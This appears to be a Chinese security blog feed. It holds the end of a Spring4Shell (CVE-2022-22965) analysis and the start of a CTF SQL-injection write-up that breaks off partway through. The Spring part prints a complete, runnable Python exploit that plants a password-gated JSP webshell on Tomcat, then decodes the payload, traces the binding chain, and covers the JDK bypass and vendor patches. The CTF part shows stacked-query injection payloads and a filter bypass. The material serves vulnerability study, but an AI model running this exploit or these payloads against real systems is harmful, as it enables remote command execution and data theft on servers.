class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(self.url,</span><br><span class="line">                          headers=headers,</span><br><span class="line">                          data=data,</span><br><span class="line">                          timeout=<span class="number">15</span>,</span><br><span class="line">                          allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                          verify=<span class="literal">False</span>)</span><br><span class="line">            time.sleep(<span class="number">10</span>) <span class="comment">## Wait for the upload to complete</span></span><br><span class="line">            shellurl = urljoin(self.url, <span class="string">&#x27;tomcatwar.jsp&#x27;</span>)</span><br><span class="line">            shellgo = requests.get(shellurl,</span><br><span class="line">                                   timeout=<span class="number">15</span>,</span><br><span class="line">                                   allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                                   stream=<span class="literal">True</span>,</span><br><span class="line">                                   verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> shellgo.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Vulnerable，shell url: <span class="subst">&#123;shellurl&#125;</span>?pwd=j&amp;cmd=whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                parsedurl = urlparse(shellurl)</span><br><span class="line">                rooturl = parsedurl.scheme+<span class="string">&quot;://&quot;</span>+parsedurl.netloc </span><br><span class="line">                shellurlroot = urljoin(rooturl, <span class="string">&#x27;tomcatwar.jsp&#x27;</span>)</span><br><span class="line">                shellgoroot = requests.get(shellurlroot,</span><br><span class="line">                                   timeout=<span class="number">15</span>,</span><br><span class="line">                                   allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                                   stream=<span class="literal">True</span>,</span><br><span class="line">                                   verify=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">if</span> shellgoroot.status_code == <span class="number">200</span>: </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Vulnerable，shell url: <span class="subst">&#123;shellurlroot&#125;</span>?pwd=j&amp;cmd=whoami&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\033[91m[&quot;</span> + <span class="string">&#x27;\u2718&#x27;</span> + <span class="string">&quot;]\033[0m&quot;</span>, self.url,</span><br><span class="line">                        <span class="string">&quot;\033[91mNot Vulnerable! :(\033[0m &quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Spring-Core Rce.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;url file&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        <span class="comment">#将exploit作为一个线程</span></span><br><span class="line">        Exploit(args.url).start()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.file) <span class="keyword">as</span> f:</span><br><span class="line">            urls = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line">            [Exploit(url).start() <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br></pre></td></tr></table></figure><h3 id="二、data段内容分析"><a href="#二、data段内容分析" class="headerlink" title="二、data段内容分析"></a>二、data段内容分析</h3><h4 id="1-调用链分析"><a href="#1-调用链分析" class="headerlink" title="1.调用链分析"></a>1.调用链分析</h4><p>​        显而易见，这个poc的核心就在于发送数据包中的内容，也就是data段的内容，我们将其进行url解码，看看他做了怎样的参数传递：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里添加了缩进,没有按照原来的空格格式，方便理解</span></span><br><span class="line"><span class="comment">//参数1</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;<span class="function">i </span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)</span>))</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">java.io.InputStreamin = </span><br><span class="line">        %&#123;c1&#125;i.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); </span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>; </span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>]; </span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125; </span><br><span class="line">&#125; </span><br><span class="line">%&#123;suffix&#125;i</span><br><span class="line"></span><br><span class="line">&amp;<span class="comment">//参数2</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</span><br><span class="line">&amp;<span class="comment">//参数3</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT</span><br><span class="line">&amp;<span class="comment">//参数4</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar</span><br><span class="line">&amp;<span class="comment">//参数5</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br></pre></td></tr></table></figure><p>​        可以看到，每个参数就是由class.module.classLoader.resources.context.parent.pipeline.first.xxx这样的调用链进行赋值的，我们虽然能看到这样的调用关系，但我们依然不知道最后的调用链怎么样的，也就是说，我们能看到有一个属性叫pattern，但我们只知道他的名字，不知道他究竟是谁。</p><p>​        因此，我们选择背景知识第一部分提到的SpringMVC实现参数绑定的方法：<code>WebDataBinder.doBind(MutablePropertyValues)</code>方法设置断点！</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220409174941438.png" alt="image-20220409174941438"></p><p>​        从此处开始，就开始进行参数的绑定工作，那么，spring的递归绑定，也就是上文中提到的可嵌套绑定又是如何实现的呢？查询发现，是通过<code>AbstractNestablePropertyAccessor</code> 类，提供对嵌套属性的支持，对于这个类的讲解，具体可以参看：<a href="https://www.bbsmax.com/A/WpdKV4ZA5V/%E3%80%82">https://www.bbsmax.com/A/WpdKV4ZA5V/。</a></p><blockquote><p>​    getPropertyAccessorForPropertyPath 根据属性(propertyPath)获取所在 bean 的包装对象 beanWrapper。如果是类似 director.info.name 的嵌套属性，则需要递归获取。真正获取指定属性的包装对象则由方法 getNestedPropertyAccessor 完成。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用自https://www.bbsmax.com/A/WpdKV4ZA5V/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> AbstractNestablePropertyAccessor <span class="title">getPropertyAccessorForPropertyPath</span><span class="params">(String propertyPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取第一个点之前的属性部分。eg: director.info.name 返回 department</span></span><br><span class="line">    <span class="keyword">int</span> pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);</span><br><span class="line">    <span class="comment">// 2. 递归处理嵌套属性</span></span><br><span class="line">    <span class="comment">// 2.1 先获取 director 属性所在类的 rootBeanWrapper</span></span><br><span class="line">    <span class="comment">// 2.2 再获取 info 属性所在类的 directorBeanWrapper</span></span><br><span class="line">    <span class="comment">// 2.3 依此类推，获取最后一个属性 name 属性所在类的 infoBeanWrapper</span></span><br><span class="line">    <span class="keyword">if</span> (pos &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        String nestedProperty = propertyPath.substring(<span class="number">0</span>, pos);</span><br><span class="line">        String nestedPath = propertyPath.substring(pos + <span class="number">1</span>);</span><br><span class="line">        AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);<span class="comment">//断！</span></span><br><span class="line">        <span class="keyword">return</span> nestedPa.getPropertyAccessorForPropertyPath(nestedPath);</span><br><span class="line">    <span class="comment">// 3. 当前对象直接返回</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        这里提到getPropertyAccessorForPropertyPath方法用于递归获取beanWrapper，然后交给getNestedPropertyAccessor 进行包装。也就是说，我们只需要在这个负责包装的函数处设置断点，步入后进行调试，一直执行到BeanWrapperImpl类中，<code>BeanPropertyHandler.getValue()</code>中就可以查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。<br>​        实际上，前8轮的递归结果都无关紧要，我们想知道的是最后一轮的情况，但是为了看的更清楚，我们附上完整的调用链条：）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</span><br><span class="line">                org.apache.catalina.webresources.StandardRoot.getContext()</span><br><span class="line">                    org.apache.catalina.core.StandardContext.getParent()</span><br><span class="line">                        org.apache.catalina.core.StandardHost.getPipeline()</span><br><span class="line">                            org.apache.catalina.core.StandardPipeline.getFirst()</span><br><span class="line"></span><br><span class="line">                                org.apache.catalina.valves.AccessLogValve.setPattern()</span><br></pre></td></tr></table></figure><p>​        这样我们就看到，最后一层调用<code>pattern</code>参数最终对应的就是<code>AccessLogValve.setPattern()</code>方法，也就是我们在tomcat前置知识中提到写入日志的部分，我们最终利用参数绑定更改了tomcat的日志写入的内容，最终导致了webshell的写入。</p><h4 id="2-参数刨析（大部分引用）"><a href="#2-参数刨析（大部分引用）" class="headerlink" title="2.参数刨析（大部分引用）"></a>2.参数刨析（大部分引用）</h4><h5 id="pattern参数："><a href="#pattern参数：" class="headerlink" title="pattern参数："></a>pattern参数：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;<span class="function">i </span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)</span>))</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">java.io.InputStreamin = </span><br><span class="line">        %&#123;c1&#125;i.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); </span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>; </span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>]; </span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125; </span><br><span class="line">&#125; </span><br><span class="line">%&#123;suffix&#125;i</span><br></pre></td></tr></table></figure><p>​    很明显，这是一个webshell，这里使用了形如<code>%&#123;xxxx&#125;i</code>的东西实际是AccessLog的一个特性，为了便于写入日志，用这样的结构来引用请求和响应header中的内容，这就解释了刚刚poc中header部分的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">            <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>进行替换后的jsp脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line"> <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                   out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>​        那我们为什么要采取这种方法呢？脚本作者是这样解释的：</p><blockquote><p># This may seem strange, but this seems to be needed to bypass some check that looks for “Runtime” in the log_pattern</p></blockquote><p>大概是一种安全措施吧。</p><h5 id="suffix参数"><a href="#suffix参数" class="headerlink" title="suffix参数:"></a>suffix参数:</h5><ul><li>参数值：<code>.jsp</code></li></ul><p>​        该参数为文件后缀。</p><h5 id="directory参数"><a href="#directory参数" class="headerlink" title="directory参数:"></a>directory参数:</h5><ul><li>参数值：<code>webapps/ROOT</code></li></ul><p>​        该参数为access_log的文件的输出目录，ROOT为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过<code>http://localhost:8080/文件名</code>访问（仅仅是为了方便，其他目录也可以）。</p><h5 id="prefix参数"><a href="#prefix参数" class="headerlink" title="prefix参数:"></a>prefix参数:</h5><ul><li>参数值：<code>tomcatwar</code></li></ul><p>​        即access_log的文件名。</p><h5 id="fileDateFormat参数"><a href="#fileDateFormat参数" class="headerlink" title="fileDateFormat参数"></a>fileDateFormat参数</h5><ul><li>参数值：空</li></ul><p>​        access_log的文件名不包含日期。</p><p>为什么要单独设置这个函数呢？</p><blockquote><p>#Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times<br>#If re-running the exploit, this will create an artifact of {old_file_name}_.jsp</p></blockquote><p>大概意思是说，这样为空的设置可以让脚本重复运行，但是亲测无效：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220409200831710.png" alt="image-20220409200831710"></p><p>​    只是简单的在一个文件里写了两遍。</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>​        通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat <code>AccessLogValve</code>的属性，让Tomcat在<code>webapps/ROOT</code>目录输出定制的“访问日志”<code>tomcatwar.jsp</code>，该“访问日志”实际上为一个JSP webshell。</p><h2 id="0x05-环境分析"><a href="#0x05-环境分析" class="headerlink" title="0x05 环境分析"></a>0x05 环境分析</h2><p>​        漏洞是一个spring+tomcat的漏洞，看似危害比较大，但是我认为还是有较为苛刻的环境限制的：</p><h3 id="一、Tomat-War的限制"><a href="#一、Tomat-War的限制" class="headerlink" title="一、Tomat+War的限制"></a>一、Tomat+War的限制</h3><p>​        上文中存在一个调用<strong>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()<strong>，只有通过这个调用关系，才能顺利实现我们预判的调用链条，二这里出现的</strong>ParallelWebappClassLoader</strong>类是只有在Web应用以war包部署到Tomcat中时才会使用到的。<br>​        如果我们更换为其他的，如jar包的部署方式，在第三次递归中，<code>classLoader</code>嵌套参数被解析为<code>org.springframework.boot.loader.LaunchedURLClassLoader</code>，查看<a href="https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java">其源码</a>，没有<code>getResources()</code>方法，也就正常的进行我们预判的调用链。<br>​        但是，这只是限制了本poc的运行环境，并不是说这个漏洞就不存在了，这个漏洞依然存在，只是需要研究出一个合理的，从Web应用到Web服务中间件的<code>class.module.classLoader....</code>的调用链，理论上如Jetty、Weblogic、Glassfish等其他web应用也是可被利用的。而且这里给出的利用方法是写入日志，还有可能写入配置文件，当然，使用更先进的技术如<a href="https://view.inews.qq.com/a/20211107A03H4C00">内存马</a>，也是有可能的！</p><p>​    因此，并不是说使用其他web应用我们就不需要防范了。</p><h3 id="二、JDK版本的限制（引用）"><a href="#二、JDK版本的限制（引用）" class="headerlink" title="二、JDK版本的限制（引用）"></a>二、JDK版本的限制（引用）</h3><p>​        在前面章节中<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>调用的过程中，实际上Spring做了一道防御。</p><p>​        Spring使用<code>org.springframework.beans.CachedIntrospectionResults</code>缓存并返回Java Bean中可以被<code>BeanWrapperImpl</code>使用的<code>PropertyDescriptor</code>。在<code>CachedIntrospectionResults</code>第289行构造方法中：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image031-1-1024x202.png" alt="img"></p><p>​        该行的意思是：当Bean的类型为<code>java.lang.Class</code>时，不返回<code>classLoader</code>和<code>protectionDomain</code>的<code>PropertyDescriptor</code>。Spring在构建嵌套参数的调用链时，会根据<code>CachedIntrospectionResults</code>缓存的<code>PropertyDescriptor</code>进行构建：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image033-1-1024x397.png" alt="img"></p><p>​        不返回，也就意味着<code>class.classLoader...</code>这种嵌套参数走不通，即形如下方的调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getClassLoader()</span><br><span class="line">        BarClassLoader.getBaz()</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure><p>​        这在JDK&lt;=1.8都是有效的。但是在JDK 1.9之后，Java为了支持模块化，在<code>java.lang.Class</code>中增加了<code>module</code>属性和对应的<code>getModule()</code>方法，自然就能通过如下调用链绕过判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getModule() // 绕过</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            BarClassLoader.getBaz()</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure><p>​        这就是为什么本漏洞利用条件之二，JDK&gt;=1.9。</p><h3 id="三、补丁分析-引用"><a href="#三、补丁分析-引用" class="headerlink" title="三、补丁分析(引用)"></a>三、补丁分析(引用)</h3><h4 id="1-Spring-5-3-18补丁"><a href="#1-Spring-5-3-18补丁" class="headerlink" title="1.Spring 5.3.18补丁"></a>1.Spring 5.3.18补丁</h4><p>通过对比Spring 5.3.17和5.3.18的版本，可以看到在3月31日有一项名为“Redefine PropertyDescriptor filter的”提交。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image035-1-1024x290.png" alt="img"></p><p>进入该提交，可以看到对<code>CachedIntrospectionResults</code>构造函数中Java Bean的<code>PropertyDescriptor</code>的过滤条件被修改了：当Java Bean的类型为<code>java.lang.Class</code>时，仅允许获取<code>name</code>以及<code>Name</code>后缀的属性描述符。在章节<code>3.2.2 ``关键点二：JDK版本</code>中，利用<code>java.lang.Class.getModule()</code>的链路就走不通了。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image037-1024x292.png" alt="img"></p><h4 id="2-Tomcat-9-0-62补丁"><a href="#2-Tomcat-9-0-62补丁" class="headerlink" title="2. Tomcat 9.0.62补丁"></a>2. Tomcat 9.0.62补丁</h4><p>通过对比Tomcat 9.0.61和9.0.62的版本，可以看到在4月1日有一项名为“Security hardening. Deprecate getResources() and always return null.”提交。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image039-1024x424.png" alt="img"></p><p>进入该提交，可以看到对<code>getResources()</code>方法的返回值做了修改，直接返回<code>null</code>。<code>WebappClassLoaderBase</code>即<code>ParallelWebappClassLoader</code>的父类，在章节<code>3.2.1 ``关键点一：Web应用部署方式</code>中，利用<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>的链路就走不通了。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image041-1024x393.png" alt="img"></p><p>这里我做了一个实验，提高了tomcat的版本，结果果然是做不通了，证实了作者的观点。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220408214635468.png" alt="image-20220408214635468"></p><h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h2><p>主要参考：<a href="https://www.aqniu.com/industry/82365.html">https://www.aqniu.com/industry/82365.html</a></p><p>poc脚本参考：</p><p><a href="https://github.com/reznok/Spring4Shell-POC">https://github.com/reznok/Spring4Shell-POC</a></p><p><a href="https://github.com/TheGejr/SpringShell">https://github.com/TheGejr/SpringShell</a></p><p><a href="https://github.com/BobTheShoplifter/Spring4Shell-POC">https://github.com/BobTheShoplifter/Spring4Shell-POC</a></p><p>漏洞信息：</p><p><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965">https://nvd.nist.gov/vuln/detail/CVE-2022-22965</a></p><p>基本情况分析参考：</p><p><a href="https://unit42.paloaltonetworks.jp/cve-2022-22965-springshell/">https://unit42.paloaltonetworks.jp/cve-2022-22965-springshell/</a></p><p>其他知识参考：</p><ul><li>Tomcat access_log配置参考文档：<a href="https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging">https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging</a></li><li>Spring 5.3.17和5.3.18版本比较：<a href="https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18">https://github.com/spring-projects/spring-framework/compare/v5.3.17…v5.3.18</a></li><li>Spring 5.3.18补丁提交内容：<a href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15">https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15</a></li><li>Tomcat 9.0.61和9.0.62版本比较：<a href="https://github.com/apache/tomcat/compare/9.0.61...9.0.62">https://github.com/apache/tomcat/compare/9.0.61…9.0.62</a></li><li>Tomcat 9.0.62补丁提交内容：<a href="https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c">https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c</a></li><li>LaunchedURLClassLoader源码：<a href="https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java">https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界supersqli_writeup</title>
      <link href="/2022/04/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csupersqli_writeup/"/>
      <url>/2022/04/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csupersqli_writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界supersqli-writeup"><a href="#攻防世界supersqli-writeup" class="headerlink" title="攻防世界supersqli_writeup"></a>攻防世界supersqli_writeup</h1><p>web这进阶区也不简单啊，为什么有那么多人做出来了…</p><p>参考：<a href="https://www.cnblogs.com/hugboy/p/13477856.html">https://www.cnblogs.com/hugboy/p/13477856.html</a></p><h2 id="0x01-判断漏洞存在"><a href="#0x01-判断漏洞存在" class="headerlink" title="0x01 判断漏洞存在"></a>0x01 判断漏洞存在</h2><p>首先，做一个引号闭合，看他用的是单引号还是双引号：</p><p>输入<code>1&#39;</code>和<code>1&quot;</code>,发现前者报错：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415130315219.png" alt="image-20220415130315219"></p><p>那么我们就知道用单引号闭合了，那我们可以先看看这个表里面有什么东西<code>1&#39; or 1=1;#</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415161300747.png" alt="image-20220415161300747"></p><p>表里面有三行，那估计我们要的值实是在其他表里了。</p><h2 id="0x02-查看数据库和表的情况"><a href="#0x02-查看数据库和表的情况" class="headerlink" title="0x02 查看数据库和表的情况"></a>0x02 查看数据库和表的情况</h2><p><code>1&#39;;show tables;#</code>查询所有的表：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415162421750.png" alt="image-20220415162421750"></p><p>也就是说，我们这个数据库中有两个表，这时候我们可以查看一下表中的内容：</p><p><code>1&#39;;show columns from words;#</code></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415170733691.png" alt="image-20220415170733691"></p><p>可以看到words就是我们当前使用的表格，然后再看另一个表：</p><p><code>1&#39;;show columns from 1919810931114514;#</code></p><p>通过上面这个命令执行发现没有显示，这是因为纯数字的话需要添加反引号包裹：</p><p>1’;show columns from `1919810931114514`;#</p><p>用上述shellcode查询后：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415171124167.png" alt="image-20220415171124167"></p><p>可以看到，这个就应该是我们需要的字段！</p><h2 id="0x03-绕过限制"><a href="#0x03-绕过限制" class="headerlink" title="0x03 绕过限制"></a>0x03 绕过限制</h2><p>我们直接查1919810931114514表中的内容试试：<strong>1’; select * from `1919810931114514`;#</strong></p><p>发现不行，做了过滤，以下关键词都不让用，改变大小写也无效：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415171744894.png" alt="image-20220415171744894"></p><p>这时候，就存在多种解决方案了，首先先上官方做法：</p><h3 id="一、改表名法"><a href="#一、改表名法" class="headerlink" title="一、改表名法"></a>一、改表名法</h3><figure class="highlight sql"><table><tr><td 